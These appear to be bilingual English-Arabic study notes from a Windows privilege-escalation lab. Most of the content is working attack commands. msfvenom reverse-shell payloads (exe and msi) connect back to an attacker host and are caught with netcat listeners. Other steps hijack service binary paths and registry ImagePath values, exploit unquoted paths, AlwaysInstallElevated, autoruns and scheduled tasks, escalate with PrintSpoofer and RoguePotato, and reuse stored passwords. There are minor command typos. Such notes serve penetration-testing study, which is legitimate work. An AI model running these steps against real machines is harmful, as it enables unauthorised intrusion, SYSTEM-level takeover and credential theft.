### Generate a Reverse Shell Executable..
in attacker machine
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=**AttackerIP** LHOST=8888 -f exe-service -o rev.exe
```

```
python3 -m http.server 80
```
in windows
```

cd C:\PrivEsc\  
wget [http://**MachineIP**/reverse.exe](http://machineip/rev.exe) -o reverse.exe

OR
curl http://attackbox:500/reverse.exe -o reverse.exe
```
change the group permission
```
icacls reverse.exe /grant Everyone:F
```

### Service Exploits — Insecure Service Permissions..
For list all services on the system running with local system privilege
(هاتلي كل ال serveses الشغاله ب صلاحيات System
```

sc query state= all | findstr /I "SERVICE_NAME STATE"

```
***Common Misconfigurations***
1-`SERVICE_CHANGE_CONFIG`: This permission allows a user to change the configuration of a service, including its executable path.
2-`SERVICE_ALL_ACCESS`: Grants full control over the service, including starting, stopping, and modifying it.
3-`WRITE_DAC`: Enables a user to modify the DACL (Discretionary Access Control List) of a service, potentially allowing them to change permissions for other users.
4-`WRITE_OWNER:` Allows a user to take ownership of the service, which can lead to further permission modifications.

```
accesschk.exe -uwcqv *

-u for filter the result 
-w to show the object has permission to write
-c to show the permisson is effective or no 
-q for filter the output to display only related with permisson
```

the command =>=> `daclsvc`
1-
```
C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc
```
انتبه لأي أذونات مثل `SERVICE_CHANGE_CONFIG` التي تسمح بتغيير تكوين الخدمة.
و ممكن يظهر غرها مثلا `SERVICE_CHANGE_CONFIG`او `SERVICE_ALL_ACCESS`او `WRITE_DAC`او `WRITE_OWNER`
__________
2- `sc qc daclsvc` => 
**تحقق مما إذا كانت الخدمة تعمل بامتيازات SYSTEM**:

**3-قم بتغيير `BINARY_PATH_NAME` إلى الملف التنفيذي الذي يحتوي على الـ reverse shell:**

```
sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""

```

in kali =>> start a listener on the port you specified in the payload
```
nc -lvnp 8888
```
4- شغل ال service
`net start daclsvc`






# Unquoted service path..

1- Use th next command to display the service does not in `C:\Windows\system32\`
```
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\"

```

2-ستعلام عن تفاصيل خدمة معينة
```
sc qc unquotedsvc

unquotedsvc = name of service

```
هذا الأمر يتيح لك التحقق مما إذا كان **BINARY_PATH_NAME** (المسار التنفيذي للملف) يحتوي على مسافات وغير مقتبس، مما يجعله عرضة للاستغلال.

3- التحقق من permissions  الكتابة على مسار الخدمة باستخدام AccessChk:

```

C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"

```

4- نسخ الـ Payload إلى مسار الخدمة غير المقتبس:


```
copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"

```

5- تشغيل الخدمة لاستغلال المسار غير المقتبس:

```

net start unquotedsvc

```

-------------------------------------------

# Windows Registery
==الـ **Windows Registry** هو مكون أساسي في نظام التشغيل Windows، حيث يعمل كقاعدة بيانات مركزية لتخزين إعدادات النظام والتطبيقات. وهو منظم في شكل هيكلي، ويحتوي على **مفاتيح (Keys)** تمثل كالأدلة و**قيم (Values)** تحتوي على بيانات التكوين الضرورية لتشغيل النظام والتطبيقات.==
++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 توضيح للأقسام الأساسية (Hives) الشائعة في الـ Registry:

- **HKEY_CURRENT_USER (==HKCU==)**: يحتوي على إعدادات خاصة بالمستخدم الحالي.
- **HKEY_LOCAL_MACHINE (==HKLM==)**: يخزن إعدادات على مستوى النظام، بما في ذلك تكوينات الأجهزة والبرامج المثبتة.

#  Weak Registry Permissions
1-يسمح لك بمشاهدة تفاصيل الخدمة، بما في ذلك `SERVICE_START_NAME`، والذي يشير إلى الامتيازات التي تعمل بها الخدمة (عادة بصلاحيات SYSTEM).
```

sc qc regsvc

```

2-استخدام `accesschk.exe` للتحقق من الصلاحيات
```

C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc


```

3-تعديل قيمة `ImagePath` باستخدام `reg add`

```

reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f

```

- `HKLM\SYSTEM\CurrentControlSet\services\regsvc`: يشير إلى مسار المفتاح الهدف.
- `/v ImagePath`: يحدد اسم القيمة (ImagePath) المراد تعديلها.
- `/t REG_EXPAND_SZ`: يحدد نوع البيانات كسلسلة قابلة للتوسيع.
- `/d C:\PrivEsc\reverse.exe`: يعيّن المسار الجديد للبرنامج التنفيذي.
- `/f`: يجبر العملية ويقوم بالكتابة دون طلب تأكيد.

**ملاحظة**: بهذا التعديل، سيتم تشغيل `reverse.exe` بصلاحيات SYSTEM عند بدء الخدمة `regsvc`.

nc -lvnp [port]

net start regsvc


----------------------------------------------------

# AlwaysInstallElevated
1- فحص إعدادات AlwaysInstallElevated في الريجستري:
```
1-

reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

2-

reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated


```

- **HKCU**: يمثل إعدادات المستخدم الحالي.
- **HKLM**: يمثل إعدادات النظام العامة (لكل المستخدمين).
 **ملاحظة**: ==إذا كانت القيمة (`AlwaysInstallElevated`) تساوي `1`== في كلا المسارين، فهذا يعني أن إعدادات النظام تتيح تثبيت ملفات .msi بصلاحيات مرتفعة، حتى للمستخدمين غير الإداريين.

2- إنشاء ملف .msi يحتوي على reverse shell:
```

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o reverse.msi

```

3-نقل ملف reverse.msi إلى النظام المستهدف
4-تشغيل  (Listener) على Kali
`nc -lvnp 53`

5-تشغيل ملف .msi بصلاحيات مرتفعة
```


msiexec /quiet /qn /i C:\PrivEsc\reverse.msi


```

-------------------------------------------------------------------
# AutoRuns
1-التحقق من وجود مسارات AutoRun في الريجستري
```

reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

```

2-فحص permissions الكتابة على ملفات AutoRun باستخدام accesschk

```


C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"

```
- **/wvu**: يشير إلى عرض أذونات الكتابة لكافة المستخدمين.
3- استبدال برنامج AutoRun بملف reverse shell
```
copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y

```

4- إعداد  (Listener) على Kali
5- تشغيل البرنامج باستخدام جلسة RDP لتفعيل الـ AutoRun
```
rdesktop MACHINE_IP
```

**ملاحظة**: ==في سيناريوهات حقيقية==، قد تحتاج إلى الانتظار حتى يقوم المسؤول (administrator) بتسجيل الدخول بنفسه لكي يتم تفعيل البرنامج بشكل تلقائي.

# Scheduled Tasks

1-. استعراض المهام المجدولة الموجودة
```
schtasks /Query /FO LIST /V
```
- **/FO LIST**: يعرض النتائج بتنسيق قائمة مفصلة.
- **/V**: يظهر التفاصيل الكاملة للمهام.

1----للتصفية حسب المهام أو الملفات التي تحتوي على كلمات معينة (مثل "TaskName" أو "Executable"):

```

schtasks /query /fo LIST /v | findstr /C:"TaskName:" /C:"Executable:"

```

2- البحث عن ملف يحتوي على سكربت مجدول

في بعض الحالات، يمكن العثور على ملف أو خدمة تشير إلى أنها مهمة مجدولة. في هذا المثال، قمنا بالتحقق من محتويات الملف التالي:

type C:\DevTools\CleanUp.ps1


الملف **CleanUp.ps1** قد يكون سكربت PowerShell مرتبط بمهمة مجدولة. فحصنا محتوى الملف للتحقق من كونه جزءًا من مهمة مجدولة تعمل بامتيازات SYSTEM.

3- التحقق من الأذونات
```


C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1


```
4-تعديل السكربت المجدول لإضافة reverse shell
```

echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1

```
يضيف هذا السطر أمرًا إلى نهاية السكربت ليشغل **reverse.exe** عند تنفيذ المهمة المجدولة.


5-  إعداد  (Listener) على Kali

------------------------------------------------------------
1- إعداد Listener على Kali  عشان يستقبل اتصال من ال reverse shell 
```
nc -lvnp 4444
```
2- الحصول على shell باستخدام Local Service :
```

C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe

```
- **-i**: تشغيل التطبيق في نفس جلسة المستخدم.
- **-u "nt authority\local service"**: تشغيل الأداة بحساب **Local Service**.
- **C:\PrivEsc\reverse.exe**: هو البرنامج الذي سيقوم بإنشاء الاتصال العكسي.

3- بدء Listener آخر على Kali
لتلقي الاتصال العكسي من shell الذي حصلنا عليه عبر **Local Service**، نبدأ مستمع آخر على **Kali**:
```
nc -lvnp 5555
```
4-استخدام PrintSpoofer لرفع الصلاحيات إلى SYSTEM
```
C:\PrivEsc\PrintSpoofer.exe -c "C:\PrivEsc\reverse.exe" -i
```
- **-c**: يشير إلى مسار **reverse.exe** الذي سيتم تشغيله.
- **-i**: يحدد أن يتم تنفيذ الأمر باستخدام **NT AUTHORITY\SYSTEM**.



# Token Impersonation - Rogue Potato

إعداد **socat** على Kali لتمرير الاتصال من المنفذ 135 على Kali إلى المنفذ 9999 على الجهاز المستهدف:

```
sudo socat tcp-listen:135,reuseaddr,fork tcp:MACHINE_IP:9999
```

بدء مستمع على Kali:

```
nc -lvnp 9999
```

تسجيل الدخول عبر **RDP** كمسؤول، ثم تشغيل **PSExec64.exe** لتشغيل **reverse.exe** باستخدام حساب **Local Service**:

```

C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe

```
تشغيل **RoguePotato** في **local service shell** للحصول على reverse shell مع صلاحيات **SYSTEM**:

```
C:\PrivEsc\RoguePotato.exe -r 10.10.10.10 -e "C:\PrivEsc\reverse.exe" -l 9999
```
----------------------------------
# Passwords - Registry


البحث عن كلمة مرور في الريجستري:

```

reg query HKLM /f password /t REG_SZ /s 


reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"

```
استخدام **winexe** لتشغيل موجه الأوامر مع صلاحيات المسؤول:

```bash
winexe -U 'admin%password' //MACHINE_IP cmd.exe
```

----------------------
# Saved Credentials - cmdkey

عرض البيانات المخزنة:

```bash
cmdkey /list
```

إذا لم تكن البيانات موجودة، تشغيل **savecred.bat**:

```
C:\PrivEsc\savecred.bat
```
بدء مستمع على **Kali**:

```
nc -lvnp 9999
```
تشغيل **reverse.exe** باستخدام **runas**:

```
runas /savecred /user:admin C:\PrivEsc\reverse.exe
```

